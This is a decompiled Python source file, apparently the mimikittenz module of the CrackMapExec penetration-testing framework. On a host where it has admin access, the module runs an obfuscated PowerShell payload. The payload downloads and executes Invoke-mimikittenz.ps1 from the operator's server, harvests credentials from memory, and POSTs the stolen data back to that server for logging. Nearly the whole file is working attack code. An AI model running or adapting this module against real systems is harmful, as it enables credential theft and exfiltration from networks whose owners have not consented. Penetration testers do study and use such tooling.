# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/mimikittenz.py
# Compiled at: 2016-12-29 01:51:56
from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log, gen_random_string
from StringIO import StringIO
from datetime import datetime
from sys import exit

class CMEModule:
    """
        Executes the Mimikittenz script
        Module by @byt3bl33d3r
    """
    name = 'mimikittenz'
    description = 'Executes Mimikittenz'

    def options(self, context, module_options):
        """
        """
        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):
        payload = ("\n        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-mimikittenz.ps1');\n        $data = Invoke-{command};\n        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');\n        $request.Method = 'POST';\n        $request.ContentType = 'application/x-www-form-urlencoded';\n        $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);\n        $request.ContentLength = $bytes.Length;\n        $requestStream = $request.GetRequestStream();\n        $requestStream.Write( $bytes, 0, $bytes.Length );\n        $requestStream.Close();\n        $request.GetResponse();").format(server=context.server, port=context.server_port, addr=context.localip, command=self.obfs_name)
        context.log.debug(('Payload: {}').format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-mimikittenz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as (ps_script):
                ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
                request.wfile.write(ps_script)
        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)
        response.stop_tracking_host()
        if len(data):

            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)
            log_name = ('MimiKittenz-{}-{}.log').format(response.client_address[0], datetime.now().strftime('%Y-%m-%d_%H%M%S'))
            write_log(data, log_name)
            context.log.info(('Saved output to {}').format(log_name))